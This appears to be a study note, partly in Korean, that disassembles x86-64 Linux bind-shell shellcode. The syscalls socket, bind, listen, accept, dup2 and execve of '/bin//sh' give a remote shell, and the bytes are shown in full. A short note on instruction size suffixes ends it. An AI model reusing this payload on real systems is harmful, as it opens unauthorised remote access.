Disassembly of section .text:            // GDB 원문

0000000000400080 <.text>:
  400080:	48 31 c0             	xor    %rax,%rax
  400083:	48 31 d2             	xor    %rdx,%rdx
  400086:	48 31 f6             	xor    %rsi,%rsi
  400089:	ff c6                	inc    %esi
  40008b:	6a 29                	pushq  $0x29
  40008d:	58                   	pop    %rax
  40008e:	6a 02                	pushq  $0x2
  400090:	5f                   	pop    %rdi
  400091:	0f 05                	syscall 
  400093:	48 97                	xchg   %rax,%rdi
  400095:	6a 02                	pushq  $0x2
  400097:	66 c7 44 24 02 15 e0 	movw   $0xe015,0x2(%rsp)
  40009e:	54                   	push   %rsp
  40009f:	5e                   	pop    %rsi
  4000a0:	52                   	push   %rdx
  4000a1:	6a 31                	pushq  $0x31
  4000a3:	58                   	pop    %rax
  4000a4:	6a 10                	pushq  $0x10
  4000a6:	5a                   	pop    %rdx
  4000a7:	0f 05                	syscall 
  4000a9:	5e                   	pop    %rsi
  4000aa:	6a 32                	pushq  $0x32
  4000ac:	58                   	pop    %rax
  4000ad:	0f 05                	syscall 
  4000af:	6a 2b                	pushq  $0x2b
  4000b1:	58                   	pop    %rax
  4000b2:	0f 05                	syscall 
  4000b4:	48 97                	xchg   %rax,%rdi
  4000b6:	6a 03                	pushq  $0x3
  4000b8:	5e                   	pop    %rsi
  4000b9:	ff ce                	dec    %esi
  4000bb:	b0 21                	mov    $0x21,%al
  4000bd:	0f 05                	syscall 
  4000bf:	75 f8                	jne    0x4000b9
  4000c1:	f7 e6                	mul    %esi
  4000c3:	52                   	push   %rdx
  4000c4:	48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx // $0x~ = '/bin//sh'
  4000cb:	2f 73 68 
  4000ce:	53                   	push   %rbx
  4000cf:	48 8d 3c 24          	lea    (%rsp),%rdi
  4000d3:	b0 3b                	mov    $0x3b,%al
  4000d5:	0f 05                	syscall

pushq 등의 'q'에 대한 설명
 - 데이터 사이즈를 의미함
b = 1  byte
w = 2  word
l = 4  double word
q = 8 quad word


